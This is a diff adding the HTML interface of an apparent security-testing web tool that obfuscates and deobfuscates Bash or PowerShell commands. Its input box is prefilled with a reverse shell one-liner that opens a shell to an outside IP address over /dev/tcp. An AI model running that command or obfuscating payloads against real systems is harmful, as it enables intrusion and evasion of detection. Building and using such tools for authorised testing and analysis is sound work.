@@ -1,0 +1,12 @@
+<div class="tk-row">
+  <div class="tk-seg" id="mode"><label><input type="radio" name="mode" value="obf" checked><span>Obfuscate</span></label><label><input type="radio" name="mode" value="deobf"><span>Deobfuscate</span></label></div>
+  <div class="tk-seg" id="shell"><label><input type="radio" name="shell" value="bash" checked><span>Bash</span></label><label><input type="radio" name="shell" value="ps"><span>PowerShell</span></label></div>
+</div>
+<div class="tk-field"><div class="tk-label"><span id="inl">command</span></div><textarea id="in" spellcheck="false" rows="4">bash -i >& /dev/tcp/10.10.14.1/443 0>&1</textarea></div>
+<div class="tk-msg" id="msg"></div>
+<div id="obf-out"></div>
+<div id="deobf-out" hidden>
+  <div class="tk-field"><div class="tk-label"><span>decoded</span><span class="r"><button type="button" class="tk-copy" data-copy="#dout">copy</button></span></div><textarea id="dout" readonly spellcheck="false" rows="4"></textarea></div>
+  <p class="dim" id="steps"></p>
+</div>
+<p class="dim">Obfuscation is best-effort and meant for payloads you are testing; the deobfuscator peels common layers (Base64, hex, char arrays, gzip, URL).</p>
